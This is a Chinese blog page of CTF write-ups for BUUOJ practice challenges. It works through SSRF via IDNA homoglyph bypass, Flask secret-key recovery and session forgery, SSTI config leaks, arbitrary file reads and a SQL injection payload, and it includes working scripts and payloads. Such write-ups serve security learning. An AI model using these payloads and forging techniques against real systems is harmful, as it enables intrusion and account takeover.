@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            BUU
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">BUU</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2022-11-10
+                        </span>
+                        
+                            <span id="/2022/11/10/BUU/" class="leancloud_visitors" data-flag-title="BUU">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2022/11/10/BUU/"></span>
+                        </span>  
+                    </p>
+                    
+                    
+                        
+                            <span class="tag-color">buu刷题记录</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h4 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h4><h5 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h5><p>nignx配置信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">Nginx配置文件：/usr/local/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href='http://ce17900a-615e-411f-b116-ae8f85e21323.node4.buuoj.cn:81/'>美化的代码</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def getUrl():</span><br><span class="line">    url = request.args.get(&quot;url&quot;) #获取url</span><br><span class="line">    host = parse.urlparse(url).hostname #获取主机名例如：http://www.baidu.com/index.php?a=111 会读取到www.baidu.com</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line">    parts = list(urlsplit(url)) #提取url中的各个字段</span><br><span class="line">    host = parts[1] #获取主机名即域名</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line">    newhost = []</span><br><span class="line">    for h in host.split(&#x27;.&#x27;):</span><br><span class="line">        newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;))#先idna编码再utf8解码</span><br><span class="line">    parts[1] = &#x27;.&#x27;.join(newhost) #组合成域名</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname #获取主机名</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;: #判断是否为suctf.cc</span><br><span class="line">        return urllib.request.urlopen(finalUrl).read() #读取finalUrl</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure>
+<p>直接贴了源码,很简单的ssrf,写个脚本用一个其他的字母绕过过一下<code>suctf.cc</code>就可以了</p>
+<p>绕过<code>h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">for i in range(1,65537):</span><br><span class="line">    i = chr(i)</span><br><span class="line">    try:</span><br><span class="line">        res = i.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if(&quot;-&quot;) in res: </span><br><span class="line">            continue</span><br><span class="line">        if res == &#x27;c&#x27;:</span><br><span class="line">            print(i)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
+<p>用脚本找一个和字符<code>c</code>一样的字符<br><code>ℂ ℭ Ⅽ ⅽ Ⓒ ⓒ Ｃ ｃ</code></p>
+<p>读文件<code>file://suctf.cℭ/usr/local/nginx/conf/nginx.conf</code><br>可以查看到flag的位置<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/BUU00002.png"></p>
+<p>payload &#x3D; <code>file://suctf.cℂ/usr/fffffflag</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/buu00000.png"></p>
+<h5 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h5><p>打开环境，可以点击read something，跳转到了百度。打开源码。<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/001001.png" alt="001001"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230221211414.png" alt="20230221211414"></p>
+<p>file和flag被禁用，想要得到flag就得伪造session让username为fuck<br>f12查看session<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230221213908.png" alt="20230221213908"></p>
+<p><a target="_blank" rel="noopener" href='https://jwt.io/'>jwt解密</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230221214126.png" alt="20230221214126"></p>
+<p><code>d3d3LWRhdGE=</code>解密为<code>www-data</code><br>可以看出来flask框架,那就是伪造session,而且flask框架可以直接试一下源码app.py<br>成功读取源码<code>app.py</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230221211550.png" alt="20230221211550"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> import re, random, uuid, urllib </span><br><span class="line"> from flask import Flask, session, request</span><br><span class="line"> </span><br><span class="line"> app = Flask(__name__)</span><br><span class="line"> random.seed(uuid.getnode()) </span><br><span class="line"> app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*233) </span><br><span class="line"> app.debug = True </span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;) </span><br><span class="line">def index(): </span><br><span class="line">		session[&#x27;username&#x27;] = &#x27;www-data&#x27; </span><br><span class="line">		return &#x27;Hello World! Read somethings&#x27; </span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/read&#x27;) </span><br><span class="line">def read(): </span><br><span class="line">		try: </span><br><span class="line">				url = request.args.get(&#x27;url&#x27;) </span><br><span class="line">				m = re.findall(&#x27;^file.*&#x27;, url, re.IGNORECASE) </span><br><span class="line">				n = re.findall(&#x27;flag&#x27;, url, re.IGNORECASE) </span><br><span class="line">				if m or n: </span><br><span class="line">				return &#x27;No Hack&#x27; </span><br><span class="line">				res = urllib.urlopen(url) </span><br><span class="line">				return res.read() </span><br><span class="line">			except Exception as ex: </span><br><span class="line">				print str(ex) </span><br><span class="line">			return &#x27;no response&#x27; </span><br><span class="line">@app.route(&#x27;/flag&#x27;)</span><br><span class="line"> def flag(): </span><br><span class="line"> 		if session and session[&#x27;username&#x27;] == &#x27;fuck&#x27;: </span><br><span class="line"> 			return open(&#x27;/flag.txt&#x27;).read() </span><br><span class="line"> 		else:</span><br><span class="line"> 			return &#x27;Access denied&#x27;</span><br><span class="line"> if __name__==&#x27;__main__&#x27;: </span><br><span class="line"> 		app.run( </span><br><span class="line"> 				debug=True, </span><br><span class="line"> 				host=&quot;0.0.0.0&quot;</span><br><span class="line"> 				 )</span><br></pre></td></tr></table></figure>
+
+<p>想要伪造session需要获得<code>SECRET_KEY</code><br>看源码我们可以知道<code>SECRET_KEY</code>的生成方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uuid.getnode()</span><br><span class="line"></span><br><span class="line">uuid.getnode函数用于获得网络接口的mac地址，如果机器具有多个网络接口，则返回通用管理的mac地址，而不是通过本地管理的mac地址返回</span><br><span class="line"></span><br><span class="line">管理的mac地址保证是全局唯一的。如果getnode函数无法获取mac地址，则他会按照rfc 4122中的建议返回带有多播位得随机48位数字。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这样的话，我们就需要找到这个地址的位置。读取<code>/sys/class/net/eth0/address</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230221215839.png" alt="20230221215839"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">random.seed(0xea87983d0be4) #当时写太慢了换了一次靶机</span><br><span class="line">str = str(random.random()*233) </span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure>
+<p>得到<code>SECRET_KEY</code>  <code>35.9402919227</code></p>
+<p>伪造脚本获取<code>git clone https://gitcode.net/mirrors/noraj/flask-session-cookie-manager.git</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">脚本使用方法</span><br><span class="line">解密：python flask_session_cookie_manager3.py decode -s &quot;secret_key&quot; -c &quot;需要解密的session值&quot;</span><br><span class="line">加密：python flask_session_cookie_manager3.py encode -s &quot;secret_key&quot; -t &quot;需要加密的session值&quot;</span><br></pre></td></tr></table></figure>
+<p>python flask_session_cookie_manager3.py decode -s “IVzE4zRGCILkaGF41cvE2C5VDK98jfNs0p3dmKhN” -c “eyJiYWxhbmNlIjoxMzM2LCJwdXJjaGFzZXMiOltdfQ.ZG3brQ.0ru6DFAYY8QVB_EkBxh56WEt9eY”<br>IVzE4zRGCILkaGF41cvE2C5VDK98jfNs0p3dmKhN<br>{‘balance’: 2000, ‘purchases’: []}<br>python flask_session_cookie_manager3.py encode -s “IVzE4zRGCILkaGF41cvE2C5VDK98jfNs0p3dmKhN” -t “{‘balance’: 2000, ‘purchases’: []}”</p>
+<p>加密<code>&#123;&#39;username&#39;: b&#39;fuck&#39;&#125;</code><br><code>python3 flask_session_cookie_manager3.py encode -s &#39;35.9402919227&#39; -t &quot;&#123;&#39;username&#39;: b&#39;fuck&#39;&#125;&quot;</code></p>
+<h5 id="FBCTF2019-Event"><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h5><p>先注册个号登进去<code>admin</code> <code>admin</code><br>没反应，应该是使用管理员登陆就可以拿到flag<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230523220525.png" alt="20230523220525"></p>
+<p>有一个&#x2F;flag,但是不是admin，那就是伪造admin登录,可能是flask伪造admin</p>
+<p>看一下cookie</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230523220956.png" alt="20230523220956"></p>
+<p>非常像，但是没有<code>secret_key</code>，所有可注入的点，尝试ssti</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230523221138.png" alt="20230523221138"></p>
+<p><code>event_important</code>可以注入,ssti查看配置文件<code>__class__.__init__.__globals__[app].config</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230523221720.png" alt="20230523221720"></p>
+<p>查到<code>secret_key</code>:<code>fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y</code></p>
+<p>签名伪造脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = b&#x27;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#x27;</span><br><span class="line"></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    print(session_serializer.dumps(&quot;admin&quot;))</span><br><span class="line"></span><br><span class="line">index()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230523222715.png" alt="20230523222715"></p>
+<h5 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h5><p>看这个页面，买flag，伪造金额，看了一下cookie，像jwt，放进去</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230524180749.png" alt="20230524180749"></p>
+<p>肯定需要<code>secret_key</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230524181013.png" alt="20230524181013"></p>
+<p>有一串<code>click to download our sweet images</code>，密钥一般在环境变量里面，没有源码，试了一下ssti，和任意文件读取</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230524181157.png" alt="20230524181157"></p>
+<p>读到密钥<code>IVzE4zRGCILkaGF41cvE2C5VDK98jfNs0p3dmKhN</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230524194100.png" alt="20230524194100"><br>解密</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230524194120.png" alt="20230524194120"><br>伪造金额,加密</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230524194212.png" alt="20230524194212"><br>修改cookie，购买flag</p>
+<h5 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h5><p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230222201937.png" alt="20230222201937"><br>打开靶机，告诉了我们禁用<code>union</code> <code>sleep</code> <code>&#39;</code> <code>&quot;</code> <code>or</code> <code>-</code> <code>benchmark</code><br>然后试了一下弱密码<code>1 || true#</code> 直接就给出了sql语句,但是好像没查询成功<br>试一下报错注入<code>1 || (updatexml(1,0x3a,1))#</code><br>这里我的页面一直没响应，我以为不可以还试了一下堆叠注入。但是也一直报错。于是看了一下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$link = mysqli_connect(&quot;database&quot;, &quot;root&quot;, &quot;password&quot;, &quot;sql_injection&quot;);</span><br><span class="line"></span><br><span class="line">if (!$link) &#123;</span><br><span class="line">    echo &quot;Error: Unable to connect to MySQL.&quot; . PHP_EOL;</span><br><span class="line">    echo &quot;Debugging errno: &quot; . mysqli_connect_errno() . PHP_EOL;</span><br><span class="line">    echo &quot;Debugging error: &quot; . mysqli_connect_error() . PHP_EOL;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;search&#x27;]))&#123;</span><br><span class="line">	$search = $_GET[&#x27;search&#x27;];</span><br><span class="line">	if(preg_match(&#x27;/(union|sleep|\&#x27;|\&quot;| or |-|benchmark)/i&#x27;, $search))&#123;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		$query = &quot;SELECT * FROM users WHERE uniqueid=$search&quot;;</span><br><span class="line">		$result=mysqli_query($link,$query) or die(mysqli_error($link));</span><br><span class="line">		$count = mysqli_num_rows($result);</span><br><span class="line">		if(mysqli_num_rows($result) === 1)&#123;</span><br><span class="line">			while($row = mysqli_fetch_array($result))&#123;</span><br><span class="line">                        	$pass = $row[&#x27;uniqueid&#x27;];</span><br><span class="line">			&#125;</span><br><span class="line">			header(&quot;Location: https://babyweb.rootersctf.in/flag0flag0123456789.php?id=&quot;.$pass);</span><br><span class="line">			die();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		echo $query;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_close($link);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>if(mysqli_num_rows($result) === 1)</code>从这里可以看出，查询出来的结果只能有一行<br>而直接查询的话，会有两行<br>payload: <code>1 || true limit 0,1#</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230222203724.png" alt="20230222203724"></p>
+<h4 id="python代码审计"><a href="#python代码审计" class="headerlink" title="python代码审计"></a>python代码审计</h4><h5 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h5><p>知识点</p>
+<blockquote>
+<p>Ruby&#x2F;ERB模板注入</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230226195806.png" alt="20230226195806"></p>
+<p>点了几下work，赚了一点钱，但是肯定不对啊。<br>bp抓包<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230226195915.png" alt="20230226195915"></p>
+<p>jwt格式,解密一下<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230226195959.png" alt="20230226195959"></p>
+<p>很明显，需要修改钱，至少要可以买的起flag。所以要伪造jwt，那就需要secret</p>
+<p>点其他几个键发现不行，就试了一下常见目录.发现<code>/robots.txt</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20230226200218.png" alt="20230226200218"></p>
+<p><code>/filebak</code>源码泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;sinatra&#x27;</span><br><span class="line">require &#x27;sinatra/cookies&#x27;</span><br><span class="line">require &#x27;sinatra/json&#x27;</span><br><span class="line">require &#x27;jwt&#x27;</span><br><span class="line">require &#x27;securerandom&#x27;</span><br><span class="line">require &#x27;erb&#x27;</span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;</span><br><span class="line"></span><br><span class="line">FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/&quot; do</span><br><span class="line">  redirect &#x27;/shop&#x27;, 302</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/filebak&quot; do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/info&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/shop&quot; do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def islogin</span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(&#x27;/shop&#x27;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>代码审计，寻找secret</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then #这里传参do和name需要相等而且还限制了字符长度</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27; #此时的auth仅仅只有ENV[&quot;SECRET&quot;]</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br></pre></td></tr></table></figure>
